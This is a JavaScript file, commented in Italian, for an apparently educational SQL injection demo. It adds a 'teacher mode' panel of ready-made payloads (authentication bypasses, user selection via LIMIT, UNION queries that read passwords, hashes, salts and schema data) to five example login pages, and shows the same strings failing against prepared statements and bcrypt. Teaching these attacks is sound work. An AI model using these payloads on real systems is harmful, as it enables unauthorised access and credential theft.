// =============================================================================
// payloads.js – Modalità Docente: payload di attacco per ogni esempio
// =============================================================================

const PAYLOADS = {
  "index.php": {
    title: "Esempio 1 — Password in chiaro, nessuna protezione",
    groups: [
      {
        label: "Accesso come utente generico",
        target: "password",
        entries: [
          { desc: "Bypass semplice con OR sempre vero", value: "x' OR 'x'='x" },
          { desc: "Bypass con commento finale",         value: "' OR '1'='1' -- x" },
        ]
      },
      {
        label: "Scegliere un utente specifico (campo username)",
        target: "username",
        entries: [
          { desc: "Primo utente (LIMIT 0,1)",  value: "' OR TRUE LIMIT 0,1 -- x" },
          { desc: "Secondo utente (LIMIT 1,1)", value: "' OR TRUE LIMIT 1,1 -- x" },
          { desc: "Terzo utente (LIMIT 2,1)",   value: "' OR TRUE LIMIT 2,1 -- x" },
        ]
      },
      {
        label: "Estrarre dati con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere le password in chiaro",                    value: "' UNION SELECT password FROM users_ex1 -- x" },
          { desc: "Nome del database",                                value: "' UNION SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1,1 -- x" },
          { desc: "Prima tabella del DB",                             value: "' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = \"sql_injection_demo\" LIMIT 0,1 -- x" },
          { desc: "Colonne della tabella users_ex1 (cambia LIMIT)",   value: "' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = \"sql_injection_demo\" AND TABLE_NAME = \"users_ex1\" LIMIT 0,1 -- x" },
        ]
      }
    ]
  },

  "example2.php": {
    title: "Esempio 2 — Hash MD5, ancora vulnerabile",
    groups: [
      {
        label: "Bypass login (campo password)",
        target: "password",
        entries: [
          { desc: "Bypass con OR sempre vero",   value: "x') OR 'x'=('x" },
          { desc: "Bypass con commento finale",  value: "') OR '1'='1' -- x" },
        ]
      },
      {
        label: "Scegliere un utente specifico (campo username)",
        target: "username",
        entries: [
          { desc: "Secondo utente (LIMIT 1,1)", value: "' OR TRUE LIMIT 1,1 -- x" },
        ]
      },
      {
        label: "Estrarre hash MD5 con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere gli hash MD5 delle password", value: "') UNION SELECT password FROM users_ex2 -- x" },
        ]
      }
    ]
  },

  "example3.php": {
    title: "Esempio 3 — SHA2 + salt, ancora vulnerabile",
    groups: [
      {
        label: "Bypass login (campo password)",
        target: "password",
        entries: [
          { desc: "Bypass con OR sempre vero",  value: "'), 128) OR TRUE -- x" },
          { desc: "Secondo utente (LIMIT 1,1)", value: "'), 128) OR TRUE LIMIT 1,1 -- x" },
        ]
      },
      {
        label: "Estrarre dati con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere gli hash SHA2",  value: "'), 128) UNION SELECT password FROM users_ex3 -- x" },
          { desc: "Leggere i salt",         value: "'), 128) UNION SELECT salt FROM users_ex3 -- x" },
        ]
      }
    ]
  },

  "example4.php": {
    title: "Esempio 4 — Prepared statements: attacchi neutralizzati",
    groups: [
      {
        label: "Prova gli stessi attacchi degli esempi precedenti",
        target: "password",
        entries: [
          { desc: "Bypass esempio 1 (non funziona)", value: "' OR '1'='1' -- x" },
          { desc: "Bypass esempio 3 (non funziona)", value: "'), 128) OR TRUE -- x" },
          { desc: "UNION injection (non funziona)",  value: "' UNION SELECT password FROM users_ex3 -- x" },
        ]
      }
    ]
  },

  "example5.php": {
    title: "Esempio 5 — Prepared statements + bcrypt: soluzione completa",
    groups: [
      {
        label: "Prova gli stessi attacchi degli esempi precedenti",
        target: "password",
        entries: [
          { desc: "Bypass (non funziona)",          value: "' OR '1'='1' -- x" },
          { desc: "UNION injection (non funziona)", value: "' UNION SELECT password FROM users_ex4 -- x" },
        ]
      }
    ]
  }
};

// =============================================================================
// Logica toggle e rendering
// =============================================================================

const STORAGE_KEY   = "docente_mode";
const STORAGE_PAGE  = "docente_last_page";
const FAKE_USERNAME = "studente";

function isDocenteMode() {
  return localStorage.getItem(STORAGE_KEY) === "1";
}

function setDocenteMode(active) {
  localStorage.setItem(STORAGE_KEY, active ? "1" : "0");
}

function currentPage() {
  return window.location.pathname.split("/").pop() || "index.php";
}

// Disattiva automaticamente la modalità se si è navigato su una pagina diversa
function checkPageChange() {
  const lastPage = localStorage.getItem(STORAGE_PAGE);
  const page     = currentPage();
  if (lastPage && lastPage !== page) {
    setDocenteMode(false);
  }
  localStorage.setItem(STORAGE_PAGE, page);
}

// Inserisce il payload nel campo corretto e popola sempre entrambi i campi
function insertPayload(target, value) {
  const usernameField = document.getElementById("username");
  const passwordField = document.getElementById("password");

  function fill(field, val) {
    if (!field) return;
    field.value = val;
    field.dispatchEvent(new Event("input", { bubbles: true }));
  }

  if (target === "username") {
    // Payload nello username: pulisce la password con valore neutro
    fill(usernameField, value);
    fill(passwordField, "password");
  } else {
    // Payload nella password: sovrascrive sempre lo username con valore fittizio
    fill(usernameField, FAKE_USERNAME);
    fill(passwordField, value);
  }

  const field = target === "username" ? usernameField : passwordField;
  if (field) field.focus();
}

// Costruisce il pannello dei payload per la pagina corrente
function buildPayloadPanel() {
  const page = currentPage();
  const data = PAYLOADS[page];
  if (!data) return null;

  const panel = document.createElement("div");
  panel.id = "docente-panel";
  panel.className = "docente-panel mt-3";

  let html = `<div class="docente-panel-header">
    <i class="fas fa-chalkboard-teacher me-2"></i>
    <strong>Modalità Docente</strong> — ${data.title}
  </div>`;

  for (const group of data.groups) {
    html += `<div class="docente-group">
      <div class="docente-group-label">${group.label}</div>`;
    for (const entry of group.entries) {
      const targetLabel = group.target === "username"
        ? '<span class="badge-target badge-username">username</span>'
        : '<span class="badge-target badge-password">password</span>';
      // data-attributes evitano problemi di escaping con apici/virgolette nei payload
      html += `
        <div class="docente-entry"
             data-target="${group.target}"
             data-value="${entry.value.replace(/&/g,'&amp;').replace(/"/g,'&quot;')}">
          ${targetLabel}
          <span class="docente-desc">${entry.desc}</span>
          <code class="docente-code">${entry.value}</code>
        </div>`;
    }
    html += `</div>`;
  }

  html += `</div>`;
  panel.innerHTML = html;

  // Listener delegato sul pannello — legge i data-attributes invece di onclick inline
  panel.addEventListener("click", (e) => {
    const entry = e.target.closest(".docente-entry");
    if (!entry) return;
    insertPayload(entry.dataset.target, entry.dataset.value);
  });

  return panel;
}

function applyDocenteMode() {
  const btn    = document.getElementById("toggle-docente");
  const active = isDocenteMode();

  if (btn) {
    btn.innerHTML = active
      ? '<i class="fas fa-eye-slash me-1"></i>Nascondi soluzioni'
      : '<i class="fas fa-chalkboard-teacher me-1"></i>Mostra soluzioni';
    btn.className = active
      ? "btn btn-warning btn-sm me-3"
      : "btn btn-outline-warning btn-sm me-3";
  }

  const existing = document.getElementById("docente-panel");
  if (existing) existing.remove();

  if (active) {
    const panel = buildPayloadPanel();
    if (panel) {
      const tableResponsive = document.querySelector(".table-responsive");
      if (tableResponsive) tableResponsive.appendChild(panel);
    }
  }
}

function toggleDocente() {
  setDocenteMode(!isDocenteMode());
  applyDocenteMode();
}

document.addEventListener("DOMContentLoaded", () => {
  checkPageChange();
  applyDocenteMode();
});

// =============================================================================
// Toggle visibilità password
// =============================================================================

function togglePassword() {
  const input = document.getElementById("password");
  const eye   = document.getElementById("password-eye");
  if (!input || !eye) return;

  if (input.type === "password") {
    input.type = "text";
    eye.classList.replace("fa-eye", "fa-eye-slash");
  } else {
    input.type = "password";
    eye.classList.replace("fa-eye-slash", "fa-eye");
  }
}
